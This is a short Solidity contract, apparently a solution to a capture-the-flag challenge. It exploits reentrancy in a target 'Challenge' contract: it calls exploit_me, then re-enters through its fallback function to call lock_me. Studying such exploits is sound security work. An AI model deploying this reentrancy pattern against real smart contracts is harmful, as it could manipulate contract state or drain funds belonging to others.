
import './Challenge.sol';

contract Attacker {
    Challenge challenge;

    constructor(address _challengeAddress) {
        challenge = Challenge(_challengeAddress);
    }

    function attack(string memory _name) public {
        challenge.exploit_me(_name);
    }

    fallback() external payable {
        // During reentrancy, call lock_me to set lock to true
        challenge.lock_me();
    }
}
